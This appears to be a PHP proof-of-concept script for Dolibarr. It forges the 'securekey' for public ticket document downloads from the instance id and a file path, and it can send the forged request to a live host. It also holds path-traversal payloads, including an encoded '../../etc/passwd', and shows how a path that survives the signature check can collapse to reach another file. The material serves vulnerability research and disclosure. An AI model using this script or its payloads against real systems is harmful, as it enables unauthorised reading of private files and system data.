#!/usr/bin/env php
<?php
/**
 * PoC helper: build the public ticket document "securekey" and optionally fetch the file.
 *
 * Replicates Dolibarr logic from:
 * - htdocs/public/ticket/document.php ($calcsecurekey)
 * - htdocs/ticket/class/actions_ticket.class.php ($securekey for ticket attachments)
 *
 * Usage:
 *   php poc_public_ticket_document.php --instance-id ID --file RELATIVE_PATH
 *   php poc_public_ticket_document.php --instance-id ID --file PATH --base-url https://host --entity 1
 *
 * @license GPL-3.0-or-later (same as Dolibarr)
 */

$dolibarrRoot = dirname(__DIR__, 2) . '/htdocs';

/**
 * Same branch as dol_hash($chain, 'sha256') in htdocs/core/lib/security.lib.php.
 */
function poc_dol_hash_sha256(string $chain): string
{
	return hash('sha256', $chain);
}

/**
 * Mirrors GETPOST(..., 'alphanohtml') / sanitizeVal alphanohtml for path traversal probes.
 * Note: full GETPOST also runs dol_string_nohtmltag; this loop matches the ../ stripping loop.
 */
function poc_sanitize_alphanohtml_path(string $raw): string
{
	$out = trim($raw);
	do {
		$old = $out;
		$out = preg_replace('/\\\([0-9xu])/', '/$1', $out);
		$out = str_ireplace(array('../', '..\\', '&#38', '&#0000038', '&#x26', '&quot', '"', '&#34', '&#0000034', '&#x22', '&#47', '&#0000047', '&#x2F', '&#92', '&#0000092', '&#x5C'), '', $out);
	} while ($old !== $out);
	return $out;
}

function poc_strip_after_mac(string $path): string
{
	$path = preg_replace('/\.\.+/', '..', $path);
	$path = str_replace('../', '/', $path);
	$path = str_replace('..\\', '/', $path);
	return $path;
}

function usage(int $code = 1): void
{
	$msg = <<<TXT
PoC: public ticket document securekey

Required:
  --instance-id STRING   Value of \$dolibarr_main_instance_unique_id from conf.php
  --file STRING          Relative path under ticket storage (e.g. TICKETREF/file.pdf)

Optional:
  --base-url URL         If set, perform GET .../public/ticket/document.php?...
  --entity N             Entity query param (default 1)
  --raw-input STRING     Use this raw query value instead of --file (for encoding tests)
  --probe-traversal      Print sanitized paths for a few hard-coded payloads

Example:
  php dev/security-poc/poc_public_ticket_document.php \\
    --instance-id 'abc123' \\
    --file 'TE2504-0001/notes.txt' \\
    --base-url 'https://example.org/dolibarr/htdocs'

TXT;
	fwrite(STDERR, $msg);
	exit($code);
}

$opts = getopt('', array('instance-id:', 'file:', 'base-url:', 'entity::', 'raw-input::', 'probe-traversal', 'help'));
if ($opts === false || isset($opts['help'])) {
	usage(isset($opts['help']) ? 0 : 1);
}

if (isset($opts['probe-traversal'])) {
	$payloads = array(
		'TE0001/../other/ref/secret.pdf',
		'....//....//x',
		'%2e%2e%2f%2e%2e%2fetc%2fpasswd',
		'TE0001/././file.pdf',
	);
	echo "Traversal / encoding probe (sanitize alphanohtml path loop only):\n";
	foreach ($payloads as $p) {
		$decoded = rawurldecode($p);
		echo "  raw:     $p\n";
		echo "  urldec:  $decoded\n";
		echo "  cleaned: " . poc_sanitize_alphanohtml_path($decoded) . "\n";
		echo "  +strip:  " . poc_strip_after_mac(poc_sanitize_alphanohtml_path($decoded)) . "\n\n";
	}
	if (empty($opts['instance-id']) && empty($opts['file']) && empty($opts['raw-input'])) {
		exit(0);
	}
}

if (empty($opts['instance-id'])) {
	fwrite(STDERR, "Error: --instance-id is required (unless you only pass --probe-traversal).\n");
	usage(1);
}

$instanceId = (string) $opts['instance-id'];
$entity = isset($opts['entity']) ? (int) $opts['entity'] : 1;

if (!empty($opts['raw-input'])) {
	$fileForMac = poc_sanitize_alphanohtml_path((string) $opts['raw-input']);
} elseif (!empty($opts['file'])) {
	$fileForMac = poc_sanitize_alphanohtml_path((string) $opts['file']);
} else {
	fwrite(STDERR, "Error: provide --file or --raw-input (or only --probe-traversal).\n");
	usage(1);
}

$securekey = poc_dol_hash_sha256('dolibarr-' . $fileForMac . '-' . $instanceId);
$fileForRead = poc_strip_after_mac($fileForMac);

echo "Dolibarr root (reference): $dolibarrRoot\n";
echo "Relative path (after alphanohtml-style clean): " . $fileForMac . "\n";
echo "Relative path (after post-MAC ../ collapse):  " . $fileForRead . "\n";
echo "securekey (sha256): $securekey\n";

if (empty($opts['base-url'])) {
	echo "\nNo --base-url: skipping HTTP request.\n";
	exit(0);
}

$base = rtrim((string) $opts['base-url'], '/');
$path = '/public/ticket/document.php';
// Build URL (document.php lives under htdocs; base-url should include /htdocs if applicable).
$query = http_build_query(array(
	'modulepart' => 'ticket',
	'attachment' => '0',
	'entity' => $entity,
	'securekey' => $securekey,
	'file' => $fileForRead,
));
$url = $base . $path . '?' . $query;
echo "\nGET $url\n";

$ch = curl_init($url);
curl_setopt_array($ch, array(
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_FOLLOWLOCATION => true,
	CURLOPT_TIMEOUT => 30,
	CURLOPT_SSL_VERIFYPEER => true,
));
$body = curl_exec($ch);
$errno = curl_errno($ch);
$code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($errno) {
	fwrite(STDERR, "curl error $errno\n");
	exit(2);
}

echo "HTTP status: $code\n";
$preview = is_string($body) ? substr($body, 0, 800) : '';
echo "Body (first 800 bytes):\n$preview\n";
exit($code >= 400 ? 3 : 0);
